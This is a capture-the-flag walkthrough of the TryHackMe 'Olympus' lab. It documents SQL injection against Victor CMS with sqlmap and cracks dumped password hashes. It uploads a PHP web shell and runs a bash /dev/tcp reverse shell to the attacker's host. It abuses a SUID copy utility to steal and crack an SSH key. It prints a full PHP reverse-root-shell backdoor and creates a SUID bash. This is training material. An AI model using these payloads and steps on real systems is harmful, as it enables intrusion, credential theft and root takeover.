| Category          | Details                                                     |
|-------------------|-------------------------------------------------------------|
| 📝 **Name**       | [Olympus](https://tryhackme.com/room/olympusroom)           |  
| 🏷 **Type**       | THM Challenge                                               |
| 🖥 **OS**         | Linux                                                       |
| 🎯 **Difficulty** | Medium                                                      |
| 📁 **Tags**       | Victor CMS, SQLi, SUID, binary analysis, backdoor discovery |

## Task 2: Flag submission

### What is Flag 1?

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/THM Olympus]
└─$ nmap -sS -sC -sV -p- $TARGET    
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-15 07:13 +0100
Nmap scan report for 10.80.166.100
Host is up (0.038s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 68:51:da:dd:bd:af:96:e8:63:e0:2b:4c:8e:55:15:e6 (RSA)
|   256 10:c6:2d:2d:23:25:e1:53:82:c9:db:ce:06:41:45:bf (ECDSA)
|_  256 1d:ce:93:ce:73:d8:ae:fb:f6:93:76:ea:56:d6:91:0e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://olympus.thm
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.95 seconds
```

#### Discover web server is using `olympus.thm` virtual host
```
┌──(magicrc㉿perun)-[~/attack/THM Olympus]
└─$ curl -I http://$TARGET
HTTP/1.1 302 Found
Date: Thu, 15 Jan 2026 06:14:02 GMT
Server: Apache/2.4.41 (Ubuntu)
Location: http://olympus.thm
Content-Type: text/html; charset=UTF-8
```

#### Add `olympus.thm` to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/THM Olympus]
└─$ echo "$TARGET olympus.thm" | sudo tee -a /etc/hosts
10.80.166.100 olympus.thm
```

#### Enumerate `olympus.thm` virtual host
```
┌──(magicrc㉿perun)-[~/attack/THM Olympus]
└─$ feroxbuster --url http://olympus.thm/ -w /usr/share/wordlists/dirb/big.txt -x php,html,js,png,jpg,py,txt,log -C 404
<SNIP>
301      GET        9l       28w      315c http://olympus.thm/~webmaster => http://olympus.thm/~webmaster/
<SNIP>
```

#### Enumerate virtual hosts
```
┌──(magicrc㉿perun)-[~/attack/THM Olympus]
└─$ ffuf -r -u http://$TARGET/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.olympus.thm" -fs 1948
<SNIP>
chat                    [Status: 200, Size: 1577, Words: 345, Lines: 42, Duration: 41ms]
<SNIP>
```

#### Add `chat.olympus.thm` to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/THM Olympus]
└─$ echo "$TARGET chat.olympus.thm" | sudo tee -a /etc/hosts
10.80.166.100 chat.olympus.thm
``` 
`chat` application is hidden behind login panel. We could enumerate it later.

#### Identify `Victor CMS` running on `olympus.thm`
```
┌──(magicrc㉿perun)-[~/attack/THM Olympus]
└─$ curl -s http://olympus.thm/~webmaster/ | grep 'CMS' | head -n 1
        <title>Victor CMS</title>
```
According to [exploit-db](https://www.exploit-db.com/exploits/48734), Victor CMS 1.0 is vulnerable to SQLi.

#### Exploit SQLi with `sqlmap` to list all databases
```
┌──(magicrc㉿perun)-[~/attack/THM Olympus]
└─$ sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" --batch --dbs
<SNIP>
available databases [6]:
[*] information_schema
[*] mysql
[*] olympus
[*] performance_schema
[*] phpmyadmin
[*] sys
<SNIP>
```

#### List all tables in `olympus` database
```
┌──(magicrc㉿perun)-[~/attack/THM Olympus]
└─$ sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" --batch -D olympus --tables
<SNIP>
Database: olympus
[6 tables]
+------------+
| categories |
| chats      |
| comments   |
| flag       |
| posts      |
| users      |
+------------+
<SNIP>
```
There `chats` table that might be related to perviously discovered application. There is also `flag` table.  

#### Capture 1st flag
```
┌──(magicrc㉿perun)-[~/attack/THM Olympus]
└─$ sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" --batch -D olympus -T flag --dump         
<SNIP>
Table: flag
[1 entry]
+---------------------------+
| flag                      |
+---------------------------+
| flag{Sm4rt!_k33P_d1gGIng} |
+---------------------------+
<SNIP>
```

### What is Flag 2?

#### Dump `users` table
```
┌──(magicrc㉿perun)-[~/attack/THM Olympus]
└─$ sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" --batch -D olympus -T users --dump
Database: olympus
Table: users
[3 entries]
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
| user_id | randsalt | user_name  | user_role | user_email             | user_image | user_lastname | user_password                                                | user_firstname |
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
| 3       | <blank>  | prometheus | User      | prometheus@olympus.thm | <blank>    | <blank>       | $2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C | prometheus     |
| 6       | dgas     | root       | Admin     | root@chat.olympus.thm  | <blank>    | <blank>       | $2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK | root           |
| 7       | dgas     | zeus       | User      | zeus@chat.olympus.thm  | <blank>    | <blank>       | $2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC | zeus           |
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
```

#### Prepare file with password hashes
```
┌──(magicrc㉿perun)-[~/attack/THM Olympus]
└─$ cat ~/.local/share/sqlmap/output/olympus.thm/dump/olympus/users.csv | tail -n +2 | head -n -1 | cut -d',' -f5,8 | tr ',' ':' > hashes.txt
```

#### Crack hashes using `hashcat`
```
┌──(magicrc㉿perun)-[~/attack/THM Olympus]
└─$ hashcat -m 3200 '$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C' /usr/share/wordlists/rockyou.txt --quiet
$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C:summertime
```
We have only manage to crack password for `prometheus` user, and we were able to use it to log in to Victor CMS admin panel. There is known RCE vulnerability where we could upload .php file as image (e.g. user's avatar) and access it from `/img` directory. However, in this case it has been secured as HTTP 403 is returned when we are trying to access files there. Our 2nd path will be credentials reuse for `chat.olympus.thm` application.

#### Reuse `prometheus` credentials to log in to `chat.olympus.thm`
![Chat](images/chat.png)

After successful log in we can see that `prometheus` and `zeus` are talking (on chat) about file upload functionality using random file name.

#### Dump `chats` table
```
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+--------------------------------------+
| dt         | msg                                                                                                                                                             | uname      | file                                 |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+--------------------------------------+
| 2022-04-05 | Attached : prometheus_password.txt                                                                                                                              | prometheus | 47c3210d51761686f3af40a875eeaaea.txt |
| 2022-04-05 | This looks great! I tested an upload and found the upload folder, but it seems the filename got changed somehow because I can't download it back...             | prometheus | <blank>                              |
| 2022-04-06 | I know this is pretty cool. The IT guy used a random file name function to make it harder for attackers to access the uploaded files. He's still working on it. | zeus       | <blank>                              |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+--------------------------------------+
```
We can see that `file` table stores randomly generated names of attached files. Now we need to find folder where those files are held.

#### Enumerate `chat.olympus.thm` virtual host
```
┌──(magicrc㉿perun)-[~/attack/THM Olympus]
└─$ feroxbuster --url http://chat.olympus.thm/ -w /usr/share/wordlists/dirb/big.txt -x php,html,js,png,jpg,py,txt,log -C 404
<SNIP>
301      GET        9l       28w      322c http://chat.olympus.thm/uploads => http://chat.olympus.thm/uploads/
<SNIP>
```

#### Access `47c3210d51761686f3af40a875eeaaea.txt` file
```
┌──(magicrc㉿perun)-[~/attack/THM Olympus]
└─$ curl -s http://chat.olympus.thm/uploads/47c3210d51761686f3af40a875eeaaea.txt
you really thought it would be this easy ?!
```

#### Prepare script for arbitrary command execution
```
┌──(magicrc㉿perun)-[~/attack/THM Olympus]
└─$ echo '<?php system($_GET["cmd"]); ?>' > cmd.php
```

#### Upload `cmd.php`
```
┌──(magicrc㉿perun)-[~/attack/THM Olympus]
└─$ curl -s -L -c cookies.txt http://chat.olympus.thm/login.php -d 'username=prometheus&password=summertime&submit=Login' -o /dev/null && \
curl -s -b cookies.txt http://chat.olympus.thm/home.php -F 'msg=cmd' -F 'submit=send' -F 'fileToUpload=@cmd.php' -o /dev/null
```

#### Query update `chat` table
```
┌──(magicrc㉿perun)-[~/attack/THM Olympus]
└─$ sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" --batch -D olympus --sql-query='SELECT file FROM chats' --fresh-queries
<SNIP>
[07:34:46] [INFO] fetching SQL SELECT statement query output: 'SELECT file FROM chats'
SELECT file FROM chats [3]:
[*] 
[*] 47c3210d51761686f3af40a875eeaaea.txt
[*] 7af3cc08d18c1e3da33a8ff306e835ff.php
<SNIP>
```
We can see that our `cmd.php` file has been uploaded as `7af3cc08d18c1e3da33a8ff306e835ff.php`.

#### Confirm arbitrary command execution is in place
```
┌──(magicrc㉿perun)-[~/attack/THM Olympus]
└─$ curl 'http://chat.olympus.thm/uploads/7af3cc08d18c1e3da33a8ff306e835ff.php?cmd=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data),7777(web)
```

#### Start `nc` to listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/THM Olympus]
└─$ nc -lvnp 4444                      
listening on [any] 4444 ...
```

#### Spawn reverse shell connection
```
CMD=$(echo "/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/4444 0>&1'" | jq -sRr @uri)
curl "http://chat.olympus.thm/uploads/7af3cc08d18c1e3da33a8ff306e835ff.php?cmd=$CMD"
```

#### Confirm foothold gained
```
connect to [192.168.130.56] from (UNKNOWN) [10.80.166.100] 59464
bash: cannot set terminal process group (834): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-80-166-100:/var/www/chat.olympus.thm/public_html/uploads$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data),7777(web)
```

#### Capture 2nd flag
```
www-data@ip-10-80-166-100:/var/www/chat.olympus.thm/public_html/uploads$ cat /home/zeus/user.flag              
flag{Y0u_G0t_TH3_l1ghtN1nG_P0w3R}
```

### What is Flag 3?

#### Discover unknown SUID binary owned by `zeus` user
Binary has been discovered by `linpeas.sh`.
```
www-data@ip-10-80-166-100:/$ ls -l /usr/bin/cputils
-rwsr-xr-x 1 zeus zeus 17728 Apr 18  2022 /usr/bin/cputils
```

#### Exfiltrate and analyze binary
![cputils](images/cputils.png)

Code analysis shows that this binary copies files from / to given path. As it has SUID permission, we could read / write any file owned by user `zeus`.

#### Use `/usr/bin/cputils` to copy SSH private key of user `zeus`
```
www-data@ip-10-80-166-100:/$ /usr/bin/cputils
  ____ ____        _   _ _     
 / ___|  _ \ _   _| |_(_) |___ 
| |   | |_) | | | | __| | / __|
| |___|  __/| |_| | |_| | \__ \
 \____|_|    \__,_|\__|_|_|___/
                               
Enter the Name of Source File: /home/zeus/.ssh/id_rsa

Enter the Name of Target File: /tmp/zeus_id_rsa

File copied successfully.
```

#### Confirm SSH private key has been copied
```
www-data@ip-10-80-166-100:/$ cat /tmp/zeus_id_rsa
cat /tmp/zeus_id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
<SNIP>
-----END OPENSSH PRIVATE KEY-----
```

#### Exfiltrate SSH private key and use it gain access as user `zeus`
```
┌──(magicrc㉿perun)-[~/attack/THM Olympus]
└─$ chmod 600 zeus_id_rsa && ssh -i zeus_id_rsa zeus@olympus.thm
Enter passphrase for key 'zeus_id_rsa': 
```
It seems that this private key is encrypted.

#### Crack SSH private key passphrase using `john`
```
┌──(magicrc㉿perun)-[~/attack/THM Olympus]
└─$ ssh2john zeus_id_rsa > zeus_id_rsa.hash && \
john zeus_id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
snowflake        (zeus_id_rsa)     
1g 0:00:01:07 DONE (2026-01-16 08:59) 0.01475g/s 22.19p/s 22.19c/s 22.19C/s iluvu..romance
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
We managed to crack passphrase this time, if however we would not be to do so we could overwrite this key using `/usr/bin/cputils`.

#### Retry gaining access over SSH using private key
```
┌──(magicrc㉿perun)-[~/attack/THM Olympus]
└─$ ssh -i zeus_id_rsa zeus@olympus.thm
Enter passphrase for key 'zeus_id_rsa': 
<SNIP>
zeus@ip-10-80-166-100:~$ id
uid=1000(zeus) gid=1000(zeus) groups=1000(zeus),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
```
During initial enumeration we came across `/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc` directory, however due to lack of privileges we were not able to list its files. Now, after escalation to `zeus` user we can access it.

#### Read content of `/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/`
```
zeus@ip-10-80-166-100:~$ ls -la /var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/
total 12
drwxrwx--x 2 root     zeus     4096 Jul 15  2022 .
drwxr-xr-x 3 www-data www-data 4096 May  1  2022 ..
-rwxr-xr-x 1 root     zeus        0 Apr 14  2022 index.html
-rwxr-xr-x 1 root     zeus     1589 Jul 15  2022 VIGQFQFMYOST.php
zeus@ip-10-80-166-100:~$ cat -n /var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php 
     1  <?php
     2  $pass = "a7c5ffcf139742f52a5267c4a0674129";
     3  if(!isset($_POST["password"]) || $_POST["password"] != $pass) die('<form name="auth" method="POST">Password: <input type="password" name="password" /></form>');
     4
     5  set_time_limit(0);
     6
     7  $host = htmlspecialchars("$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]", ENT_QUOTES, "UTF-8");
     8  if(!isset($_GET["ip"]) || !isset($_GET["port"])) die("<h2><i>snodew reverse root shell backdoor</i></h2><h3>Usage:</h3>Locally: nc -vlp [port]</br>Remote: $host?ip=[destination of listener]&port=[listening port]");
     9  $ip = $_GET["ip"]; $port = $_GET["port"];
    10
    11  $write_a = null;
    12  $error_a = null;
    13
    14  $suid_bd = "/lib/defended/libc.so.99";
    15  $shell = "uname -a; w; $suid_bd";
    16
    17  chdir("/"); umask(0);
    18  $sock = fsockopen($ip, $port, $errno, $errstr, 30);
    19  if(!$sock) die("couldn't open socket");
    20
    21  $fdspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
    22  $proc = proc_open($shell, $fdspec, $pipes);
    23
    24  if(!is_resource($proc)) die();
    25
    26  for($x=0;$x<=2;$x++) stream_set_blocking($pipes[x], 0);
    27  stream_set_blocking($sock, 0);
    28
    29  while(1)
    30  {
    31      if(feof($sock) || feof($pipes[1])) break;
    32      $read_a = array($sock, $pipes[1], $pipes[2]);
    33      $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    34      if(in_array($sock, $read_a)) { $i = fread($sock, 1400); fwrite($pipes[0], $i); }
    35      if(in_array($pipes[1], $read_a)) { $i = fread($pipes[1], 1400); fwrite($sock, $i); }
    36      if(in_array($pipes[2], $read_a)) { $i = fread($pipes[2], 1400); fwrite($sock, $i); }
    37  }
    38
    39  fclose($sock);
    40  for($x=0;$x<=2;$x++) fclose($pipes[x]);
    41  proc_close($proc);
    42  ?>
```
Brief analysis shows that this directory contains `VIGQFQFMYOST.php` which seems to be a backdoor, hidden behind password, that spawn reverse root shell connection.

#### Start `nc` to listen for reverse root shell connection
```
┌──(magicrc㉿perun)-[~/attack/THM Olympus]
└─$ nc -lvnp 5555
listening on [any] 5555 ...
```

#### Spawn reverse root shell connection
```
┌──(magicrc㉿perun)-[~/attack/THM Olympus]
└─$ curl "http://$TARGET/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php?ip=$LHOST&port=5555" -d 'password=a7c5ffcf139742f52a5267c4a0674129'
```

#### Confirm `root` access
```
connect to [192.168.130.56] from (UNKNOWN) [10.80.166.100] 60580
Linux ip-10-80-166-100 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 08:42:23 up  2:13,  1 user,  load average: 0.11, 0.07, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
zeus     pts/0    192.168.130.56   08:16    7:35   0.08s  0.08s -bash
id
uid=0(root) gid=0(root) groups=0(root),33(www-data),7777(web)
```
Since this shell is unstable, e.g. we are not able to read `root.flag` due to `0` char, we'll just use it create `/bin/bash` based root shell. 

#### Create root shell in `/home/zeus/`
```
/bin/cp /bin/bash /home/zeus/root_shell && /bin/chmod +s /home/zeus/root_shell && ls -l /home/zeus/root_shell
-rwsr-sr-x 1 root root 1183448 Jan 16 08:48 /home/zeus/root_shell
```

#### Escalate to `root` user using `/home/zeus/root_shell`
```
zeus@ip-10-80-166-100:~$ /home/zeus/root_shell -p
root_shell-5.0# id
uid=1000(zeus) gid=1000(zeus) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),1000(zeus)
```

#### Capture 3rd flag
```
root_shell-5.0# cat /root/root.flag | grep -oP flag{.+}
flag{D4mN!_Y0u_G0T_m3_:)_}
```

## What is Flag 4?
`/root/root.flag` contains information about 4th, hidden flag.
> PS : Prometheus left a hidden flag, try and find it ! I recommend logging as root over ssh to look for it ;)

#### Capture 4th flag
```
root_shell-5.0# grep -R -n -E 'flag\{.+\}' /etc 2> /dev/null
/etc/ssl/private/.b0nus.fl4g:3:flag{Y0u_G0t_m3_g00d!}
```
